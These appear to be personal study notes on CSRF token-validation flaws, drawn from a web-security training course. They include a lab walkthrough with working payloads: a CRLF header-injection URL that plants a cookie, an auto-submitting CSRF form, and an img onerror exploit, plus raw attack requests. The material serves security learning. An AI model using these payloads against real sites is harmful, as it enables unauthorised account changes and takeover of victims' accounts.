
CSRF vulnerabilities typically arise due to flawed ==validation== of CSRF tokens.



---
# Validation of CSRF token depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```



---
# Validation of CSRF token depends on token being present

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```



---
# CSRF token is not tied to the user session

==**Some** applications do not validate that the token belongs to the same session as the user who is making the request==.

==Instead, the application maintains a **global pool of tokens** that it has issued and accepts any token that appears in this pool==.


**==In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack==**.


----
# CSRF token is tied to a non-session cookie

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. 

This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```


```html
<form 
	method="POST" 
	action="https://0afe00fe0303393f8133992f00b0001f.web-security-academy.net/my-account/change-email">
	<input 
		type="email" 
		name="email" 
		value="ioo&#64;ooi&#46;com">
	<input 
		required="" 
		type="hidden" 
		name="csrf" 
		value="SFiVydJVzo6Pwl6OHsCmf7r6TmYbTrKd">
</form>

<script>
	document.forms[0].submit();
</script>
```

This situation is harder to exploit but is still vulnerable. 
==**If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible**==. 
The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

**Note**
The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. 
Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope.
For example, a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`





----
# CSRF token is tied to a non-session cookie

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions.

This can easily occur when an application employs two different frameworks, ==one for session handling== and ==one for CSRF protection==, which are not integrated together:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

This situation is harder to exploit but is still vulnerable. 

If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.

The attacker can log in to the application using their own account, obtain a valid token and associated cookie, [leverage](https://translate.google.com/?sl=en&tl=ar&text=leverage&op=translate) the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.


The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. 
Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. 
For example, a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.




---
# Lab: CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

#### Solution
1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

2. Send the request to Burp Repeater and observe that changing the `session` cookie logs you out, but changing the `csrfKey` cookie merely results in the CSRF token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.

3. Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.

4. Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted.

5. Close the Repeater tab and incognito browser.

6. Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. ==**Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser (HTTP header injection).**==

7. Create a URL that uses this vulnerability to inject your `csrfKey` cookie into the victim's browser:
```http
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```
Decoded URL:
```http
/?search=test
Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
```

8. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that you include your CSRF token. The exploit should be created from the email change request.

9. Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:
```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

10. Change the email address in your exploit so that it doesn't match your own.

11. Store the exploit, then click "Deliver to victim" to solve the lab.



---
# CSRF token is simply duplicated in a cookie

In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. 

When the subsequent request is validated, ==the application simply verifies that the token submitted in the **request parameter** matches the value submitted in the **cookie**==. 

This is sometimes called the "==**double submit**==" defense against CSRF, and is [advocated](https://translate.google.com/?sl=en&tl=ar&text=advocated&op=translate) because it is simple to implement and avoids the need for any server-side state:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. 

==Here, the attacker **doesn't** need to obtain a valid token of their own==.

They simply invent a token (perhaps in the required format, if that is being checked), [leverage](https://translate.google.com/?sl=en&tl=ar&text=leverage&op=translate) the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.


```http
POST /my-account/change-email HTTP/2
Host: 0a3100bf03ec80cee407a3000037005d.web-security-academy.net
Cookie: csrf=kM67Gg5Prt3bzPIEJrJB4RPrRCHGZCbv; session=yMsjsCTMobvfdm0FkgbJSmgw8e3poto6
Content-Length: 61
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a3100bf03ec80cee407a3000037005d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3100bf03ec80cee407a3000037005d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=wiener%40user.net&csrf=kM67Gg5Prt3bzPIEJrJB4RPrRCHGZCbv
```
This key `kM67Gg5Prt3bzPIEJrJB4RPrRCHGZCbv` is repeated in `cookie` and in `csrf token` 

**==In case like that the server site does't aware about the value of the `csrf` but just looking for matches.==**

**==So we can replace this value `csrf` with any value but we have to replace it with both location in parameter (http header) and on cookies==**.
